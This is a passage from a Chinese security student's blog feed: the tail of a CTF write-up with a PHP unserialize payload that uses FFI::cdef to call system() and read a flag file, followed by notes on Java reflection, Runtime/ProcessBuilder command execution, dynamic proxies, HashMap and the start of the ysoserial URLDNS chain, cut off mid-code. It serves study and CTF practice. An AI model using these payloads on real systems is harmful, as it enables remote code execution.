class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然这里可以利用<code>$this-&gt;data[&#39;ret&#39;] = $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</code>来执行函数，但是最重要的还是很多函数被ban了</p>
<p>这里要用到php的一个扩展<a href="https://www.jianshu.com/p/c1f268aaf791/">FFI扩展</a>，它支持php调用c的代码</p>
<p>FFI::cdef([string ![cdef = “” <a href="https://math.jianshu.com/math?formula=cdef%20=%20%22%22%20%5B,%20string">, string</a>lib = null]]): FFI</p>
<p>所以可以构造poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI:cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char* command)&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># C%3A1%3A%22A%22%3A87%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A8%3A%22FFI%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A25%3A%22int+system%28char%2A+command%29%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=unserialize(urldecode(&#x27;C%3A1%3A%22A%22%3A89%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A26%3A%22int+system%28char+%2Acommand%29%3B%22%3B%7D%7D&#x27;))-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag&gt;/var/www/html/1.txt&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>第一周结束了，感觉学到的新知识也不是很多，很多遇到的新知识都没有彻底理解，下周效率要高一点了</p>
<p>~</p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅱ</title>
    <url>/2022/03/29/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A1/</url>
    <content><![CDATA[<blockquote>
<p>Java反射再学习、动态代理（未学透）、CC1……</p>
</blockquote>
<h3 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h3><p><del>上次只是跟着视频打了一遍代码，但是很多都还不懂，所以这次就来仔细认识一下</del></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">参考</a></p>
<h4 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h4><p>1.Class类</p>
<p>每加载一种<code>class</code>，JVM就会创建一个<code>Class</code>，也就说JVM持有的每个Class实例都指向一个数据类型，而如果在类中有静态初始化器的话，JVM必然会执行该类的静态代码段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><code>Class</code>里面存储着一个<code>class</code>的所有信息，可以直接去Java里面查看一些属性和方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="comment">//获取String类</span></span><br><span class="line">        Class c = String.class;</span><br><span class="line">        System.out.println(c.getName());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// java.lang.String</span></span><br></pre></td></tr></table></figure>

<p><code>getName</code>|<code>getMethod</code>|<code>getMethods</code>|<code>getClassLoader</code>……</p>
<p><img src="https://img-blog.csdnimg.cn/c71a43b6415a4c6fb7955a96f2cd863b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p><code>getName()</code>获取类名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line">     <span class="comment">//获取String类</span></span><br><span class="line">        <span class="class"><span class="keyword">Class</span> <span class="title">c</span> = <span class="title">String</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="title">c</span>.<span class="title">getName</span>());</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">// <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="title">String</span>[] <span class="title">args</span>) <span class="title">throws</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">Class</span> <span class="title">c</span> = <span class="title">Test</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">s</span> = &quot;&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="title">c</span>.<span class="title">getName</span>());</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">// <span class="title">demo</span>.<span class="title">Test</span></span></span><br></pre></td></tr></table></figure>

<p><code>getMethod(String)</code> 获取其中一个方法</p>
<p><code>getMethods()</code> 返回带有所有方法的数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getMethod(<span class="string">&quot;exp&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// public void demo.Test.exp() throws java.lang.Exception</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getMethods()[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//public void demo.Test.exp() throws java.lang.Exception</span></span><br></pre></td></tr></table></figure>

<p><code>getClass</code> 获取类 | <code>forName</code> 当知道类的全名的时候</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Class c = Test.class;</span><br><span class="line">      System.out.println(c.toString());</span><br><span class="line">     <span class="comment">//class demo.Test</span></span><br><span class="line">      Class c1 = Class.forName(<span class="string">&quot;demo.Test&quot;</span>);</span><br><span class="line">      System.out.println(c1.toString());</span><br><span class="line"><span class="comment">//class demo.Test</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>getModifiers()</code>返回类、属性、方法的修饰符</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>对应的int类型</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>1</td>
</tr>
<tr>
<td>private</td>
<td>2</td>
</tr>
<tr>
<td>protected</td>
<td>4</td>
</tr>
<tr>
<td>static</td>
<td>8</td>
</tr>
<tr>
<td>final</td>
<td>16</td>
</tr>
<tr>
<td>synchronized</td>
<td>32</td>
</tr>
<tr>
<td>volatile</td>
<td>64</td>
</tr>
<tr>
<td>transient</td>
<td>128</td>
</tr>
<tr>
<td>native</td>
<td>256</td>
</tr>
<tr>
<td>interface</td>
<td>512</td>
</tr>
<tr>
<td>abstract</td>
<td>1024</td>
</tr>
<tr>
<td>strict</td>
<td>2048</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getModifiers());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p><code>newInstance()</code>可以实例化类 ，但是只会调用类的无参构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Test t1 = <span class="keyword">new</span> Test();</span><br><span class="line">    Class c = t1.getClass();</span><br><span class="line">    Test test = (Test) c.newInstance();</span><br><span class="line">    test.exp();</span><br><span class="line">    System.out.println(c.newInstance());</span><br><span class="line">    Class c1 = Class.forName(<span class="string">&quot;demo.Test&quot;</span>);</span><br><span class="line">    System.out.println(c1.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getField(String)</code>| <code>getDeclareField(String)</code>|<code>getFields()</code> 获取由public修饰的属性 | <code>getDeclaredFields()</code>获取所有属性</p>
<p><code>getConstructor</code> | <code>getConstructors</code> | <code>getDeclaredConstructor</code> | <code>getDeclaredConstructors</code> 可以利用构造方法进行实例化</p>
<p><img src="https://img-blog.csdnimg.cn/d4b66cc286514ce6b0022cfb7bd9a40e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><h5 id="1-实例化"><a href="#1-实例化" class="headerlink" title="1.实例化"></a>1.实例化</h5><blockquote>
<p>这⾥也需要注意⼀点，在JDK1.9往上，不再使⽤newInstance()。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// forName可操作时</span></span><br><span class="line">Class.forName(<span class="string">&quot;&quot;</span>);</span><br><span class="line">Class.forName(<span class="string">&quot;&quot;</span>).newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 已经存在该对象 但是我们控制不了该对象的时候</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">cl.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用构造方法</span></span><br><span class="line">cl.getConstructor().newInstance();</span><br></pre></td></tr></table></figure>

<h5 id="2-调用方法"><a href="#2-调用方法" class="headerlink" title="2.调用方法"></a>2.调用方法</h5><p><img src="https://img-blog.csdnimg.cn/75b1ce41e97c45faa08ee77d1ad0a1ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无参数</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance());</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/124b138b0c634bf9b799023428971721.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//存在参数</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exp&quot;</span>, String.class);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/228a4100f4834a7cb1e80bc4fbee9c64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h5 id="3-访问私有（属性、方法）"><a href="#3-访问私有（属性、方法）" class="headerlink" title="3.访问私有（属性、方法）"></a>3.访问私有（属性、方法）</h5><p>关键：<code>setAccessible()</code>|<code>getDeclared</code></p>
<p>私有属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Field field = cl.getDeclaredField(<span class="string">&quot;score&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(cl.newInstance(),<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>私有方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getDeclaredMethod(<span class="string">&quot;exp&quot;</span>, String.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="4-命令执行方法"><a href="#4-命令执行方法" class="headerlink" title="4.命令执行方法"></a>4.命令执行方法</h5><p><code>Runtime</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">Method method1 = cl.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object o = method1.invoke(cl);</span><br><span class="line">method.invoke(o, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>ProcessBuilder</code></p>
<p>ProcessBuilder通过实例化的时候传入<code>command</code>调用<code>start</code>方法进行命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">cl.getMethod(<span class="string">&quot;start&quot;</span>).invoke(cl.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br><span class="line"><span class="comment">// 但是要求有Arrays包</span></span><br></pre></td></tr></table></figure>

<p><code>varargs</code>可变长参数，用于当我们想利用ProcessBuilder的另一个构造方法的时候</p>
<p>P神如是说：</p>
<p><img src="https://img-blog.csdnimg.cn/0fd65f86658445dfaa297ba7e51c8069.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br><span class="line"><span class="comment">// 但是后面的 new String[][]&#123;&#123;&quot;calc&quot;&#125;&#125; 该怎么用反射呢</span></span><br></pre></td></tr></table></figure>

<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="- 动态代理"></a>- 动态代理</h3><p>Java中通常会有静态代理、动态代理和cglib代理</p>
<p><strong>静态代理</strong>就是我们最常用的，利用<code>implements</code>关键字创建实现类实现某一个接口，然后再通过实例化该类从而实现对接口的调用，有时也会通过创建另一个代理类实现对前一个类的调用</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestIns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">TestIns</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestIns testIns = <span class="keyword">new</span> Test();</span><br><span class="line">        testIns.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<strong>动态代理</strong>并不需要创建代理类，可以通过JDK提供的<code>Proxy.newProxyInstance()</code>和<code>InvocationHandler</code>实现实例化接口，调用接口的类</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTwo</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InvocationHandler() &#123; <span class="comment">// 用于实现调用接口的方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;test&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;ttest&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制转化 实现对接口的实例化</span></span><br><span class="line">        TestIns testIns = (TestIns) Proxy.newProxyInstance(</span><br><span class="line">                TestIns.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;TestIns.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line">        testIns.test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TestIns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么现在来试着跟进了解一下<code>Proxy.newProxyInstance</code>和<code>InvocationHandler</code></p>
<p><code>InvocationHandler</code>是由代理实例的调用处理程序实现的接口。每个代理实例都有一个关联的调用处理程序。在代理实例上调用方法时，方法调用将被编码并发送到其调用处理程序的invoke方法。按照个人的理解，即可以在InvocationHandler里面对接口的方法进行重载或者其他操作。</p>
<p><code>Proxy.newProxyInstance</code>的定义（参数分别是类加载器、一个实例以及一个InvocationHandler：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>

<p><a href="https://qiankunli.github.io/2020/04/09/java_dynamic_proxy.html">参考</a>暂时审计java的代码真的理解不能，<em>记号！！！</em></p>
<h3 id="Map-HashMap……"><a href="#Map-HashMap……" class="headerlink" title="Map/HashMap……"></a>Map/HashMap……</h3><blockquote>
<p>因为对Map类不熟悉的话 很难真的懂下面的链子，所以就先浅浅了解一下</p>
</blockquote>
<p><code>Map</code>是一个接口也可说是集合类，其中&lt;&gt;代表为泛型，而Map为键值对的集合，其中每一个键映射到一个值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Map</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>基本方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// 返回映射键值对的个数</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>; <span class="comment">// 判断集合类是否为空 即不包含任何键值对则返回true</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span>; <span class="comment">// 判断集合类中是否包含该映射</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span>; </span><br><span class="line"><span class="function">V <span class="title">get</span><span class="params">(Object key)</span></span>; <span class="comment">// 返回key对应的value</span></span><br><span class="line"><span class="function">V <span class="title">put</span><span class="params">(K key, V value)</span></span>; <span class="comment">// 将指定的键和值互相关联 会返回与键关联的上一个值或者如果与键关联的上一个值为null的话会返回null</span></span><br><span class="line"><span class="function">V <span class="title">remove</span><span class="params">(Object key)</span></span>; <span class="comment">// 如果包含该key关联的映射则直接删除，并返回之前与key关联的value或者null</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">// 清除集合</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>; <span class="comment">// 返回该映射的哈希值</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>而就像上面讲到的一样，<code>HashMap</code>就是接口<code>Map</code>的一个实现类，在里面实现了<code>Map</code>的方法</p>
<p><code>HashMap</code></p>
<p>好几个内部类现在就先不看了，继续看后面的</p>
<p>有四个构造方法<code>HashMap</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;  <span class="comment">// 参数不能为负数</span></span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity); <span class="comment">// 返回initialCapacity的两倍幂。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR); <span class="comment">// 将常量和int一起传，重新调用一次上面的构造方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// all other fields defaulted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123; <span class="comment">// 传入一个Map类型的参数</span></span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// 默认值</span></span><br><span class="line">    putMapEntries(m, <span class="keyword">false</span>); <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>put</code>方法，利用<code>putValue</code>实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>小结1：因为跟着走了一下，所以对这个集合类有了大概的了解，所以就先看到这里，等之后遇到新的方法的时候再记录到这里（鸽</p>
</blockquote>
<h3 id="URL-DNS链"><a href="#URL-DNS链" class="headerlink" title="URL DNS链"></a>URL DNS链</h3><p><del>再再再次来走一遍URLDNS链！！！！！</del></p>
<p>urldns链子主要是在反序列化的时候触发<code>HashMap</code>的<code>readObject</code>方法，触发<code>hash</code>函数，从而可以触发<code>URL</code>的<code>hashCode</code>方法触发DNS请求，通常用来验证题目是否存在反序列化漏洞</p>
<p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">        <span 